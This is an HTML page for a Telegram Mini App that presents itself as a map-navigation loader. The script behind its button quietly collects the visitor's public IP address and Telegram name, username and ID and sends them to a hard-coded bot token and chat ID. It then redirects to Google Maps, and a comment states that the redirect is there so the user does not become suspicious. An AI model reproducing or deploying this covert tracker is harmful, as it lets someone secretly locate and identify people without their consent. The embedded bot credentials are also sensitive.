<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>系統載入中</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            height: 100vh; margin: 0; font-family: -apple-system, sans-serif;
            background-color: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
        }
        #btn {
            padding: 18px 35px; font-size: 18px; font-weight: bold; cursor: pointer;
            background-color: var(--tg-theme-button-color, #2481cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none; border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: transform 0.1s;
        }
        #btn:active { transform: scale(0.95); }
        #info { margin-top: 20px; font-size: 14px; color: var(--tg-theme-hint-color, #888); }
    </style>
</head>
<body>

    <button id="btn">🚀 進入地圖導航</button>
    <div id="info">準備就緒</div>

    <script>
        // 初始化 Telegram
        const tg = window.Telegram.WebApp;
        
        try {
            tg.ready();
            tg.expand();
        } catch (e) {
            console.error("TG SDK 初始化失敗");
        }

        // 設定你的資訊 (請確認 Token 沒貼錯空格)
        const BOT_TOKEN = '8791584619:AAHyvuJ9an8oF3z21kUxtZIbyVVmLk_jEhM';
        const MY_CHAT_ID = '1287211539';

        document.getElementById('btn').addEventListener('click', async () => {
            const btn = document.getElementById('btn');
            const infoDiv = document.getElementById('info');
            
            btn.disabled = true;
            infoDiv.innerText = "正在連線至安全伺服器...";

            try {
                // 1. 取得 IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIp = ipData.ip;

                // 2. 取得 Telegram 使用者資料 (關鍵修正)
                // 在手機端，資料存在 tg.initDataUnsafe.user 裡
                let userName = "未知用戶";
                let userId = "未知ID";

                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                    const u = tg.initDataUnsafe.user;
                    userName = u.first_name + (u.last_name ? " " + u.last_name : "");
                    if (u.username) userName += ` (@${u.username})`;
                    userId = u.id;
                }

                // 3. 組裝訊息
                const message = `📢 警報：用戶 [${userName}] (ID: ${userId}) 已點擊按鈕\n🌐 來源 IP: ${userIp}`;
                
                // 4. 發送至 Bot API
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: MY_CHAT_ID,
                        text: message,
                        parse_mode: "HTML"
                    })
                });

                // 5. 成功後轉向
                infoDiv.innerText = "載入成功，正在跳轉...";
                setTimeout(() => {
                    tg.openLink('https://www.google.com/maps');
                    tg.close();
                }, 300);

            } catch (err) {
                // 如果失敗，彈出錯誤訊息視窗以便除錯
                tg.showAlert("發生錯誤: " + err.message);
                // 依然嘗試跳轉，不讓用戶起疑
                tg.openLink('https://www.google.com/maps');
            }
        });
    </script>
</body>
</html>
